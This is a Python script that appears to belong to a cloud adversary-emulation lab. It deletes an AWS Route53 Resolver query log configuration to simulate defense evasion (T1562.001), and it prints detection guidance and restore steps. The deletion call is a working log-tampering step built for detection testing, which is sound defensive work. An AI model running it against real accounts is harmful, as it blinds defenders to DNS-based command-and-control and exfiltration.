"""
Technique : aws.defense-evasion.dns-delete-logs
Tactic    : Defense Evasion (T1562.001)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.dns-delete-logs/

Pre-requisites:
  - Run `pulumi up` in ../infra/ to create the Route53 Resolver query log config.

How the attack works:
  Route53 Resolver query logs record all DNS queries made from resources within
  a VPC, providing critical visibility into C2 communication and data exfiltration
  over DNS.  An attacker with route53resolver:DeleteResolverQueryLogConfig can
  permanently delete this logging configuration, blinding defenders to DNS activity.

Detection signal:
  - route53resolver:DeleteResolverQueryLogConfig
  - Loss of DNS query log events in CloudWatch or S3 after the deletion.

Revert:
  - None. The log config is permanently deleted.
  - Run `pulumi up` in ../infra/ to recreate it.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir  = str(Path(__file__).parent.parent / "infra")
    infra      = get_pulumi_outputs(stack_dir)
    config_id  = infra.get("resolver_query_log_config_id", "")

    if not config_id:
        print("[!] resolver_query_log_config_id not found. Did you run `pulumi up`?")
        return

    session    = boto3.Session()
    r53_client = session.client("route53resolver")

    # ── Step 1: Delete the resolver query log config ──────────────────────────
    banner("Step 1 — Delete Route53 Resolver query log config (DeleteResolverQueryLogConfig)")
    try:
        r53_client.delete_resolver_query_log_config(
            ResolverQueryLogConfigId=config_id,
        )
        print(f"  [+] Resolver query log config deleted: {config_id}")
        print(f"  [!] CloudTrail event: route53resolver:DeleteResolverQueryLogConfig")
        print(f"  [!] DNS query logging is now DISABLED for associated VPCs.")
        print(f"  [!] This is a NON-REVERSIBLE operation (run `pulumi up` to restore).")
    except ClientError as exc:
        print(f"  [!] DeleteResolverQueryLogConfig failed: {exc}")
        return

    banner("Complete")
    print("CloudTrail event generated: route53resolver:DeleteResolverQueryLogConfig")
    print("\nDetection guidance:")
    print("  Alert on route53resolver:DeleteResolverQueryLogConfig — loss of DNS")
    print("  visibility is a high-confidence defense evasion signal.")
    print("\nRun `pulumi up` in ../infra/ to recreate the log config.")


if __name__ == "__main__":
    main()
